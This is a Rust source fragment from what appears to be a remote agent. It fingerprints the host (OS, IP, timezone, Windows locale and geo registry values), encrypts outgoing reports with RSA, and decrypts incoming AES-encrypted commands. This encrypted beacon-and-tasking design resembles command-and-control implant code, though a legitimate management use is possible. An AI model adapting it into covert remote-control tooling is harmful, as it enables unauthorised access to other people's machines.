// Collect system stats
fn collect_system_stats(sys: &mut System) -> AgentStats {
    sys.refresh_all();

    let cpu_usage = sys.global_cpu_info().cpu_usage();
    let memory_total = sys.total_memory();
    let memory_used = sys.used_memory();
    let uptime = System::uptime();

    let platform = format!(
        "{} {}",
        System::name().unwrap_or("Unknown".to_string()),
        System::os_version().unwrap_or("".to_string())
    );

    let ip = match std::net::UdpSocket::bind("0.0.0.0:0") {
        Ok(socket) => match socket.connect("8.8.8.8:80") {
            Ok(_) => match socket.local_addr() {
                Ok(addr) => addr.ip().to_string(),
                Err(_) => "127.0.0.1".to_string(),
            },
            Err(_) => "127.0.0.1".to_string(),
        },
        Err(_) => "127.0.0.1".to_string(),
    };

    let local_now = Local::now();
    let timezone = format!("{:?}", local_now.offset());

    #[cfg(windows)]
    let (locale, geo_id) = {
        use winreg::enums::*;
        use winreg::RegKey;
        
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let locale = hkcu.open_subkey("Control Panel\\International")
            .and_then(|k| k.get_value::<String, _>("LocaleName"))
            .unwrap_or_else(|_| "Unknown".to_string());
            
        let geo_id = hkcu.open_subkey("Control Panel\\International\\Geo")
            .and_then(|k| k.get_value::<String, _>("Nation"))
            .unwrap_or_else(|_| "NotSet".to_string());
            
        (locale, geo_id)
    };

    #[cfg(not(windows))]
    let (locale, geo_id) = {
        let locale = std::env::var("LANG").unwrap_or_else(|_| "Unknown".to_string());
        (locale, "N/A".to_string())
    };

    AgentStats {
        cpu_usage,
        memory_total,
        memory_used,
        uptime,
        platform,
        ip,
        locale,
        timezone,
        geo_id,
    }
}

// Pack data: Prepend log_id + Compress (gzip) + RSA encrypt + Base64 encode
fn pack_data(config: &Config, input: &str, log_id: &str) -> Result<String, Box<dyn Error>> {
    // Step 1: Compress with gzip
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(input.as_bytes())?;
    let compressed = encoder.finish()?;

    // Step 2: Prepend log_id to compressed data
    let mut data_with_id = log_id.as_bytes().to_vec();
    data_with_id.extend_from_slice(&compressed);

    // Step 3: RSA encrypt with public key
    let public_key = RsaPublicKey::from_public_key_pem(&config.public_key_pem)?;
    let mut rng = rand::thread_rng();

    // Encrypt in chunks (RSA has size limits based on key size)
    let mut encrypted_chunks = Vec::new();
    let chunk_size = (public_key.size() - 11) as usize; // PKCS1v15 padding overhead

    for chunk in data_with_id.chunks(chunk_size) {
        let enc_chunk = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, chunk)?;
        encrypted_chunks.push(enc_chunk);
    }

    // Flatten all encrypted chunks
    let encrypted: Vec<u8> = encrypted_chunks.into_iter().flatten().collect();

    // Step 4: Base64 encode
    Ok(encode(&encrypted))
}

// Unpack AES encrypted command: Base64 decode + AES decrypt + Decompress
fn unpack_encrypted_command(
    config: &Config,
    input: &str,
    nonce_b64: &str,
) -> Result<String, Box<dyn Error>> {
    // Step 1: Decode AES key from hex (trim whitespace)
    let key_hex = config.aes_key_hex.trim();
    let key_bytes = hex::decode(key_hex).map_err(|e| {
        format!(
            "Failed to decode AES key hex: {}. Key length: {}",
            e,
            key_hex.len()
        )
    })?;

    if key_bytes.len() != 32 {
        return Err(format!("AES key must be 32 bytes, got {}", key_bytes.len()).into());
    }

    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
    let cipher = Aes256Gcm::new(key);

    // Step 2: Base64 decode encrypted data and nonce
    let ciphertext = decode(input)?;
    let nonce_bytes = decode(nonce_b64)?;
    let nonce = Nonce::from_slice(&nonce_bytes);

    // Step 3: AES-GCM decrypt
    let decrypted = cipher
        .decrypt(nonce, ciphertext.as_ref())
        .map_err(|e| format!("AES decryption failed: {}", e))?;

    // Step 4: Decompress
    let mut decoder = GzDecoder::new(&decrypted[..]);
    let mut decompressed = String::new();
    decoder.read_to_string(&mut decompressed)?;

    Ok(decompressed)
}

